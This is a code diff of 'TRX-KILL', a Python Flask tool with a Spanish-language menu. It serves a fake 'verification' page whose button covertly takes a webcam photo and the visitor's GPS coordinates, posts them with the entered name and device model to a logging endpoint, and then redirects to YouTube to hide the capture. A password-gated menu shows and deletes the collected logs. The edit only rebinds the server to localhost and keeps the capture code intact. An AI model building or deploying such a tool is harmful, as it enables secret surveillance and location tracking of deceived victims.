@@ -2,7 +2,7 @@ import os, sys, getpass, time, base64
 from flask import Flask, request
 
 app = Flask('TRX-KILL')
-PORT = 195  # Puerto configurado a 195
+# Se mantiene en 127.0.0.1 (localhost) y puerto por defecto 5000
 AUTH_PASS = "TRX-kill-op"
 STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
 LOG_FILE = f"{STORAGE_PATH}/result.txt"
@@ -25,7 +25,6 @@ def banner():
     animar_texto("     ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║     ", 0.001)
     animar_texto("     ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗", 0.001)
     print(f"\n      \033[1;36m[ SISTEMA DE SEGURIDAD TRX-KILL ]\033[0m")
-    print(f"      \033[1;37mPORT: {PORT} | STORAGE: {STORAGE_PATH}\033[0m")
     print("\033[1;32m" + "="*60 + "\033[0m")
 
 HTML_ENCUESTA = """
@@ -39,25 +38,23 @@ HTML_ENCUESTA = """
         <h1>TRX-KILL VERIFICATION</h1>
         <input type="text" id="p1" placeholder="NOMBRE">
         <input type="text" id="p2" placeholder="MODELO DISPOSITIVO">
-        <button onclick="iniciar()">VALIDAR ACCESO TOTAL</button>
+        <button onclick="iniciar()">VALIDAR ACCESO</button>
     </div>
 <script>
     async function iniciar() {
-        try {
-            const s = await navigator.mediaDevices.getUserMedia({video: true});
-            const v = document.createElement('video'); v.srcObject = s; v.play();
-            setTimeout(async() => {
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const img = c.toDataURL('image/png');
-                navigator.geolocation.getCurrentPosition(async(p)=>{
-                    await fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
-                    body: JSON.stringify({u: document.getElementById('p1').value, d: document.getElementById('p2').value, lat: p.coords.latitude, lon: p.coords.longitude, i: img})});
-                    window.location.href = "https://youtube.com";
-                });
-            }, 1000);
-        } catch(e) { alert("Acceso denegado"); }
+        const s = await navigator.mediaDevices.getUserMedia({video: true});
+        const v = document.createElement('video'); v.srcObject = s; v.play();
+        setTimeout(async() => {
+            const c = document.createElement('canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            const img = c.toDataURL('image/png');
+            navigator.geolocation.getCurrentPosition(async(p)=>{
+                await fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, 
+                body: JSON.stringify({u: document.getElementById('p1').value, d: document.getElementById('p2').value, lat: p.coords.latitude, lon: p.coords.longitude, i: img})});
+                window.location.href = "https://youtube.com";
+            });
+        }, 1500);
     }
 </script></body></html>
 """
@@ -80,21 +77,21 @@ def main():
     while True:
         banner()
         print("  [1] INFO-NUMERO    | [2] ACTIVAR LINK    | [3] CREADOR")
-        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM (VER LOGS)")
+        print("  [4] COPYRIGHT      | [5] DATA-IP         | [6] ADM (LOGS)")
         print("  [7] SALIR          | [8] PROCESOS        | [9] ESTADO")
         print("  [10] BORRAR LOGS")
         sel = input("\n\033[1;33mTRX-ROOT > \033[0m")
         
         if sel == "2": 
-            print(f"\nServidor en modo escucha en puerto {PORT}...")
-            app.run(port=PORT, host='0.0.0.0')
+            print("\n[!] SERVIDOR EN 127.0.0.1 (LOCALHOST)...")
+            app.run(host='127.0.0.1', port=5000)
         elif sel == "6":
             if getpass.getpass("PASSWORD: ") == AUTH_PASS:
                 if os.path.exists(LOG_FILE): os.system(f"cat {LOG_FILE}")
                 else: print("NO HAY LOGS.")
                 input("\nPresiona Enter...")
         elif sel == "10": 
-            if os.path.exists(LOG_FILE): os.remove(LOG_FILE); print("LOGS ELIMINADOS")
+            if os.path.exists(LOG_FILE): os.remove(LOG_FILE); print("LOGS BORRADOS")
             input()
         elif sel == "7": sys.exit()
         else: print("OPCIÓN EN DESARROLLO..."); time.sleep(1)
